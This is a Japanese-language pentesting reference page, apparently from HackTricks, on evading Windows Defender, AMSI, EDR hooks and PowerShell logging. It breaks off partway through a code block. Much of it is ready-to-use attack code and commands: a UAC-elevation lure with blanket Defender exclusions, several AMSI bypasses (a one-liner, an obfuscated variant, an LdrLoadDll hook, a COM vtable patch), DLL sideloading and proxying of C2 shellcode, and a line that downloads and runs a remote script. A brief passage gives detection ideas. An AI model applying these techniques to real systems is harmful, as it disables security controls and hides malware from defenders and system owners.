# Antivirus (AV) の回避

{{#include ../banners/hacktricks-training.md}}

**このページの初稿は** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました！**

## Defender を停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を装って Windows Defender の動作を停止するツール。
- [管理者の場合に Defender を無効化する](basic-powershell-for-pentesters/README.md)

### Defender を改変する前にインストーラー風の UAC 誘導を行う

ゲームチートを装う公開ローダーは、署名されていない Node.js/Nexe インストーラーとして配布され、まず**ユーザーに昇格を求めてから** Defender を無効化することがよくあります。流れはシンプルです。

1. `net session` で管理者権限の有無を確認します。このコマンドは実行ユーザーが管理者権限を持つ場合にのみ成功するため、失敗した場合、ローダーは標準ユーザーとして実行されています。
2. 元のコマンドラインを維持しながら `RunAs` 動詞を使って直ちに自身を再起動し、想定される UAC の同意プロンプトを表示します。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「クラック済み」ソフトウェアをインストールしていると思っているため、通常はプロンプトを受け入れ、マルウェアに Defender のポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する `MpPreference` の一括除外

昇格後、GachiLoader風の手法では、サービスを完全に無効化するのではなく、Defender の監視の隙を最大限に広げます。まずローダーは GUI の watchdog（`taskkill /F /IM SecHealthUI.exe`）を強制終了し、次に**極めて広範な除外設定**を追加して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン対象外にします。

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- このループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこに配置されたペイロードも無視されます**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、Defenderに再び手を加えることなく、後から署名されていないドライバーを読み込めるようにしています。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` に保存されるため、後続のステージで、UACを再度発生させずに除外が維持されていることを確認したり、対象を追加したりできます。

Defenderのサービスは停止されないため、単純な正常性チェックでは引き続き「ウイルス対策が有効」と報告されますが、リアルタイム検査はこれらのパスを対象にしません。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

現在、AVはさまざまな方法でファイルが悪意のあるものかどうかを判定します。静的検出、動的解析、そしてより高度なEDRでは振る舞い分析が使われます。

### **静的検出**

静的検出は、バイナリやスクリプト内の既知の悪意ある文字列やバイト列を検出するほか、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出することで行われます。そのため、一般に公開されているツールを使うと、すでに解析されて悪意あるものとして検出されている可能性が高く、見つかりやすくなります。この種の検出を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検出する方法はなくなりますが、プログラムをメモリ上で復号して実行するための何らかのloaderが必要です。

- **難読化**

バイナリやスクリプト内の文字列をいくつか変更するだけでAVをすり抜けられる場合もありますが、難読化する対象によっては時間のかかる作業です。

- **独自ツールの開発**

独自のツールを開発すれば、既知の悪意あるシグネチャは存在しませんが、多くの時間と労力がかかります。

> [!TIP]
> Windows Defenderの静的検出に対するチェックには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。ファイルを複数のセグメントに分割し、それぞれを個別にスキャンするようDefenderに指示します。これにより、バイナリ内のどの文字列やバイトが検出対象になったのかを正確に特定できます。

実践的なAV Evasionについては、この[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### 静的分類器向けのオフラインPE特徴テスト

パックまたは暗号化されたペイロードのバイト列は、静的分類器への入力の一部にすぎません。EMBER2024は、インポート、エクスポート、セクション、ヘッダー、AuthenticodeデータなどのPE特徴を抽出します。<sup>[[48]](#references)</sup> あるloaderの実験では、無害に見えるインポートを141個追加したところ、EMBER2024の悪意スコアが93%低下し、マルウェアに関連付けられたインポートを追加するとスコアが上昇しました。これは、そのモデルとサンプルでの結果であり、特定のAV/EDR製品を確実に回避できることを示すものではありません。<sup>[[50]](#references)</sup>

許可を得たloaderテストでは、ペイロードと実行経路を一定に保ち、各バリアントで意図したビルド変数を1つだけ変更し、スコアをオフラインで比較してください。ビルドの変更は複数の特徴グループに影響する可能性があるため、生成されたPE特徴を調べてください。<sup>[[49]](#references)[[50]](#references)</sup> 意図したインポートをIATに保持するには、選択したWin32 APIを到達可能なコードから呼び出します。選択するAPIを変え、固定のカモフラージュ関数がシグネチャ化されるのを避けるため、ビルドごとに呼び出し箇所を分散させてください。この実験では、有効なコード署名、エクスポートエントリ、`.pdata`を拡大する関数の増加によってもスコアが低下しました。一方、無効な署名の効果はほとんどなく、`.pdata`による効果も小さいものでした。<sup>[[50]](#references)</sup>

`thrember`パッケージは、特徴抽出とベンチマークモデルを提供します。インストール後、既存の`models`ディレクトリを指定して`thrember.download_models("models")`を実行し、その後、親ディレクトリからスコアラーを実行してください。このダウンロードヘルパーは現在の作業ディレクトリを変更します。PE分類器を使えば、スキャンサービスに送信することなく、ビルドのディレクトリをスコアリングできます。<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

比較中は、model と feature-extractor のバージョンを固定してください。offline score が低下したとしても、この classifier が変更後の binary にどう反応するかを示すだけであり、behavioral analysis、emulation、またはベンダー独自の別の model を回避できたことの証明にはなりません。<sup>[[49]](#references)[[50]](#references)</sup> [virtualized payloads におけるビルドごとの polymorphism と外側の binary の camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable)については、別の execution model を参照してください。

### **Dynamic analysis**

Dynamic analysis とは、AV が sandbox で binary を実行し、悪意のある動作（例: ブラウザーのパスワードを復号して読み取ろうとする、LSASS の minidump を実行するなど）を監視することです。この対策は少し扱いが難しい場合もありますが、sandbox を回避するためにできることをいくつか紹介します。

- **実行前にスリープする** 実装方法によっては、AV の dynamic analysis を回避する優れた方法になります。AV がファイルをスキャンできる時間は、ユーザーの作業を妨げないよう非常に短いため、長時間スリープさせると binary の分析を妨げられることがあります。問題は、実装方法によっては、多くの AV sandbox がスリープをスキップできることです。
- **マシンのリソースを確認する** 通常、Sandbox が使えるリソースは非常に限られています（例: RAM が 2GB 未満）。そうでなければ、ユーザーのマシンの動作が遅くなる可能性があります。CPU の温度やファンの回転速度を確認するなど、工夫できる点はほかにもあります。Sandbox ですべてが実装されているわけではありません。
- **マシン固有のチェックを行う** 「contoso.local」ドメインに参加しているワークステーションのユーザーを標的にしたい場合、コンピューターのドメインを確認し、指定したドメインと一致しなければプログラムを終了させることができます。

Microsoft Defender の Sandbox のコンピューター名は HAL9TH です。そのため、マルウェアの実行前にコンピューター名を確認し、HAL9TH と一致したら Defender の Sandbox 内にいると判断して、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox に対抗するための、[@mgeeky](https://twitter.com/mariuszbit) によるその他の優れたヒントを紹介します。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

この記事で前述したように、**public tools** はいずれ**検出されます**。そこで、自分にこう問いかけてみてください。

たとえば、LSASS を dump したい場合、**本当に mimikatz を使う必要がありますか**。それとも、あまり知られていない別のプロジェクトで LSASS を dump できますか。

おそらく、後者が正解です。mimikatz を例にすると、AV や EDR に最も検出される malware のひとつ、あるいは最も検出される malware と言ってもよいでしょう。プロジェクト自体は非常に優れていますが、AV を回避するために使うのは非常に厄介です。実現したいことに応じた代替手段を探しましょう。

> [!TIP]
> 回避のために payload を変更する際は、defender の**自動サンプル送信をオフにしてください**。また、長期的な回避を目指すのであれば、**絶対にVIRUSTOTALにアップロードしないでください**。特定の AV に payload が検出されるか確認したい場合は、VM にインストールし、自動サンプル送信をオフにして、納得のいく結果が得られるまでそこでテストしてください。

## EXEs vs DLLs

可能であれば、回避には常に**DLLの使用を優先してください**。私の経験では、DLL ファイルは通常、**検出や分析を受ける頻度がはるかに低い**ため、payload を DLL として実行する方法がある場合には、検出を避けるための非常に簡単な手段になります。

この画像を見ると、Havoc の DLL Payload は antiscan.me で検出率が 4/26 である一方、EXE payload の検出率は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常の Havoc EXE payload と通常の Havoc DLL の antiscan.me での比較</p></figcaption></figure>

次に、DLL ファイルを使ってさらに stealthier にするためのテクニックをいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、victim application と悪意のある payload を並べて配置し、loader が使用する DLL search order を利用します。

[ Siofra](https://github.com/Cybereason/siofra) と以下の powershell script を使って、DLL Sideloading の影響を受けやすいプログラムを確認できます。

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、`"C:\Program Files\\"` 内にあるDLL hijackingの影響を受けるプログラムと、それらが読み込もうとするDLLファイルの一覧を出力します。

**DLL Hijackable/Sideloadable programs** を自分で調べることを強くおすすめします。この手法は適切に実行すればかなりステルス性が高いですが、公開されているDLL Sideloadable programsを使うと、簡単に検知される可能性があります。

プログラムが読み込もうとする名前の悪意あるDLLを配置するだけでは、payloadは読み込まれません。プログラムはそのDLL内に特定の関数があることを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** という別の手法を使います。

**DLL Proxying** は、プログラムからの呼び出しをプロキシ（悪意ある）DLLから元のDLLへ転送します。これにより、プログラムの機能を維持しながらpayloadを実行できます。

[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを、[@flangvik](https://twitter.com/Flangvik/) によるものとして使用します。

以下は、私が実行した手順です。

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドで、DLL のソースコードテンプレートと、名前を変更した元の DLL の2つのファイルが生成されます。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

これが結果です。

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのshellcode（[SGN](https://github.com/EgeBalci/sgn)でエンコード）とproxy DLLは、[antiscan.me](https://antiscan.me)でDetection rateが0/26でした！成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについての理解を深めるために、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と、[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)を**ぜひ**視聴することをおすすめします。

### Forwarded Exportsの悪用（ForwardSideLoading）

Windows PEモジュールは、実際には「forwarder」である関数をエクスポートできます。コードを指す代わりに、エクスポートエントリには`TargetDll.TargetFunc`形式のASCII文字列が格納されます。呼び出し元がエクスポートを解決すると、Windows loaderは次の処理を行います。

- `TargetDll`がまだロードされていない場合はロードする
- そこから`TargetFunc`を解決する

理解しておくべき主な動作：
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs namespaceから提供されます（例：ntdll、kernelbase、ole32）。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合、通常のDLL search orderが使われます。これには、forward解決を行うモジュールのディレクトリも含まれます。

これにより、間接的なsideloadingの手法が可能になります。関数がKnownDLLではないモジュール名にforwardされている署名済みDLLを見つけ、そのDLLと同じディレクトリに、forward先のモジュール名と完全に一致する名前の攻撃者制御DLLを配置します。forwarded exportが呼び出されると、loaderはforwardを解決し、同じディレクトリから攻撃者のDLLをロードして、そのDllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例：

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダーに悪意のある `NCRYPTPROV.dll` を配置します。コード実行には最小限の DllMain で十分です。DllMain を実行させるために、転送先の関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みのLOLBinで転送をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

動作の確認結果:
- rundll32 (signed) が side-by-side の `keyiso.dll` (signed) を読み込む
- `KeyIsoSetAuditingInterface` の解決中、loader は forward をたどって `NCRYPTPROV.SetAuditingInterface` に到達する
- その後、loader は `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合でも、「missing API」エラーが発生するのは `DllMain` の実行後

調査のヒント:
- 対象モジュールが KnownDLL ではない forwarded export に注目する。KnownDLL は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に記載されている。
- 次のようなツールを使って forwarded export を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 の forwarder インベントリを参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知・防御のアイデア:
- LOLBins（例: rundll32.exe）がシステム外のパスから署名済み DLL を読み込み、その後、同じディレクトリから同じベース名を持つ非 KnownDLLs を読み込む動作を監視する
- 次のようなプロセス／モジュールの連鎖を検知する: `rundll32.exe` → システム外の `keyiso.dll` → ユーザーが書き込み可能なパスにある `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込みと実行を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、suspended process、direct syscall、代替実行方式を利用して EDR を回避する payload ツールキットです`

Freeze を使用すると、ステルス性を保ちながら shellcode を読み込んで実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionは猫とネズミの追いかけっこのようなもので、今日有効な手法が明日には検知される可能性があります。そのため、1つのツールだけに頼らず、可能であれば複数のevasion techniqueを組み合わせてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRは、`ntdll.dll`のsyscall stubに**user-mode inline hook**を仕掛けることがよくあります。これらのhookを回避するには、正しい**SSN**（System Service Number）を読み込み、hookされたexportのentrypointを実行せずにkernel modeへ移行する**direct**または**indirect**なsyscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出し方法:**
- **Direct (embedded)**: 生成したstubに`syscall`/`sysenter`/`SVC #0`命令を埋め込みます（`ntdll`のexportを経由しません）。
- **Indirect**: `ntdll`内にある既存の`syscall` gadgetへジャンプし、kernelへの移行が`ntdll`から始まったように見せます（ヒューリスティック検知の回避に有用）。**randomized indirect**では、呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: 静的な`0F 05` opcode sequenceをディスク上に埋め込まず、実行時にsyscall sequenceを解決します。

**hook耐性のあるSSN解決方法:**
- **FreshyCalls (VA sort)**: stubのbyteを読み取る代わりに、syscall stubをvirtual address順に並べてSSNを推測します。
- **SyscallsFromDisk**: クリーンな`\KnownDlls\ntdll.dll`をmapし、その`.text`からSSNを読み取った後、unmapします（メモリ上のすべてのhookを回避します）。
- **RecycledGate**: VA順のSSN推測と、stubがクリーンな場合のopcode検証を組み合わせます。hookされている場合はVA推測にフォールバックします。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使って実行時に`EAX`からSSNを取得します。hookされたbyteの解析は不要です。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

クリーンな x64 `ntdll` の syscall export を解析して SSN を取得する際は、`4C 8B D1 B8`（`mov r10, rcx; mov eax, imm32`）と、その前に `F3 0F 1E FA`（`endbr64`）が付いた同じシーケンスの両方に対応してください。後者は CET-prefixed stub です。SSN が常に固定オフセットにあると仮定する parser では、これを検出できません。indirect-syscall の初期化に失敗して loader が `GetProcAddress` にフォールバックすると、これらの export 経由の呼び出しで、再び user-mode hook に遭遇する可能性があります。<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI は「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AV がスキャンできるのは**ディスク上のファイル**だけでした。そのため、何らかの方法で payload を**メモリ内で直接**実行できれば、AV は十分な可視性を持たず、それを防ぐことができませんでした。

AMSI 機能は、Windows の以下のコンポーネントに統合されています。

- User Account Control、つまり UAC（EXE、COM、MSI、ActiveX のインストール時の昇格）
- PowerShell（スクリプト、対話的な使用、動的コード評価）
- Windows Script Host（wscript.exe および cscript.exe）
- JavaScript および VBScript
- Office VBA マクロ

これにより、スクリプトの内容を復号・難読化解除された状態で公開し、ウイルス対策ソリューションがスクリプトの動作を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defender で以下のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` に続いて、スクリプトを実行した実行ファイルのパスが付加されていることに注目してください。この例では powershell.exe です。

ディスクにはファイルを一切書き込みませんでしたが、AMSI によってメモリ内で検出されました。

さらに、**.NET 4.8** 以降では、C# コードも AMSI を通じて実行されます。これは、メモリ内実行のために `Assembly.Load(byte[])` で読み込む場合にも影響します。そのため、AMSI を回避してメモリ内実行を行いたい場合は、低いバージョンの .NET（4.7.2 以下など）の使用が推奨されます。

AMSI を回避する方法はいくつかあります。

- **Obfuscation**

AMSI は主に静的検知を行うため、読み込もうとするスクリプトを変更することは、検知を回避する有効な方法になり得ます。

ただし、AMSI は複数のレイヤーがあるスクリプトでも難読化を解除できるため、やり方によっては obfuscation が適切でない場合があります。そのため、回避は簡単ではありません。一方で、変数名をいくつか変更するだけでうまくいく場合もあるため、どの程度フラグが立てられているかによります。

- **AMSI Bypass**

AMSI は DLL を powershell（cscript.exe、wscript.exe など）のプロセスに読み込むことで実装されているため、非特権ユーザーとして実行していても簡単に改変できます。この AMSI の実装上の欠陥を利用し、研究者たちは AMSI スキャンを回避する複数の方法を発見しています。

**強制的にエラーを発生させる**

AMSI の初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されなくなります。この方法は当初 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、その後 Microsoft は広範な利用を防ぐための signature を開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShell codeを1行実行するだけで、現在のPowerShellプロセスでAMSIを使用不能にできました。もちろん、この行自体がAMSIによって検知されるため、この手法を使うには何らかの変更が必要です。

以下は、こちらの[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から引用した、改変済みのAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この手法は当初 [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。amsi.dll 内の「AmsiScanBuffer」関数（ユーザーが入力した内容のスキャンを担当）のアドレスを見つけ、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 となり、クリーンな結果として解釈されます。

> [!TIP]
> 詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)をお読みください。

AMSI を powershell で bypass する手法はほかにも多数あります。詳しくは[**こちらのページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**こちらのrepo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### `AmsiScanBuffer` の patching に代わる、AMSI COM の scan-pointer リダイレクト

プロセス内で完結する別の bypass 手法では、`AmsiScanBuffer` のエントリーポイントには手を加えません。報告されている 64-bit .NET loader では、CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` から AMSI COM オブジェクトを作成し、`Marshal.GetIUnknownForObject()` でインターフェースポインターを取得します。さらに、オフセット `0x18` にある vtable スロットをスキャン呼び出しの宛先として使用します。loader は `Console.Clear()` の native ポインターに短い x64 stub を書き込み、`VirtualProtect()` を使ってその vtable エントリーを stub に変更した後、元のページ保護を復元します。前提条件となるのは 64-bit のポインター幅と、想定される COM レイアウトです。このオフセットは、任意の AMSI インターフェースやビルドに適用できる汎用の値ではありません。先に確認されている段階は、[署名済み AppDomainManager sidecar の読み込み](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget)と[RESX のデシリアライズ](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml)です。<sup>[[51]](#references)</sup>

確認された stub のバイト列は `41 C7 00 01 00 00 00 33 C0 C3` です。これは `r8` の結果ポインターに **1** を書き込み、`eax` で **0** を返します。したがって、スキャン結果が `AMSI_RESULT_CLEAN`（0）であるという報告は、`S_OK` の戻り値と出力 enum を混同しています。文書化されている `AMSI_RESULT` の順序では、結果 **1** は `AMSI_RESULT_NOT_DETECTED` です。それでも検出しきい値未満です。<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll の読み込みを防いで AMSI をブロックする（LdrLoadDll hook）

AMSI は、現在のプロセスに `amsi.dll` が読み込まれた後にのみ初期化されます。堅牢で言語に依存しない bypass 手法は、`ntdll!LdrLoadDll` に user-mode hook を設置し、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ 疑似コード）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell、WScript/CScript、カスタム loader のいずれでも動作します（通常なら AMSI をロードするものすべて）。
- スクリプトを stdin 経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、長いコマンドラインの痕跡を避けられます。
- LOLBins 経由で実行される loader（例: `DllRegisterServer` を呼び出す `regsvr32`）で使われているのが確認されています。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** ツールも、AMSI を bypass するスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** ツールも、ランダム化されたユーザー定義関数、変数、文字式を使い、PowerShell キーワードの大文字・小文字をランダムに変更して署名を回避する、AMSI を bypass するスクリプトを生成します。

**検出された署名を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などのツールを使って、現在のプロセスのメモリから検出された AMSI 署名を削除できます。このツールは、現在のプロセスのメモリをスキャンして AMSI 署名を探し、NOP 命令で上書きすることで、メモリから実質的に削除します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使用する**
PowerShell version 2 を使用すると AMSI はロードされないため、AMSI にスキャンされずにスクリプトを実行できます。次のようにします。

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題になることもあります**。

PowerShell logging を回避するには、次の手法を使用できます。

- **PowerShell Transcription と Module Logging を無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) などのツールを使用できます。
- **PowerShell version 2 を使用する**: PowerShell version 2 では AMSI が読み込まれないため、AMSI にスキャンされずにスクリプトを実行できます。次のように実行できます: `powershell.exe -version 2`
- **unmanaged PowerShell session を使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使うと、`powershell.exe` を起動せずに PowerShell をホストできます（Cobalt Strike の `powerpick` が使う手法です）。これにより、`powershell.exe` プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、その他すべての PowerShell 防御が自動的に無効になるわけではありません。対応状況は、runtime とホストの実装によって異なります。


## Obfuscation

> [!TIP]
> いくつかの obfuscation 手法ではデータを暗号化するため、バイナリのエントロピーが高まり、AV や EDR に検知されやすくなります。この点に注意し、暗号化は機密性が高い、または隠す必要があるコードの特定の部分にのみ適用することを検討してください。

### ConfuserEx で保護された .NET バイナリの Deobfuscation

ConfuserEx 2（または商用フォーク）を使用したマルウェアを解析する際、逆コンパイラやサンドボックスを妨げる複数層の保護に直面することがよくあります。以下のワークフローを使うと、ほぼ元の IL を確実に**復元**でき、その後 dnSpy や ILSpy などのツールで C# に逆コンパイルできます。<sup>[[10]](#references)</sup>

1.  Anti-tampering の除去 – ConfuserEx はすべての *method body* を暗号化し、*module* の static constructor（`<Module>.cctor`）内で復号します。また、PE checksum にパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller** を使用して暗号化されたメタデータテーブルを特定し、XOR keys を復元して、クリーンなアセンブリを書き出します:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   出力には、独自のunpackerを作成する際に役立つ6つのアンチタンパーパラメーター（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル / 制御フローの復元 – *クリーンな*ファイルを**de4dot-cex**（de4dotのConfuserEx対応フォーク）に渡します。
   ```bash
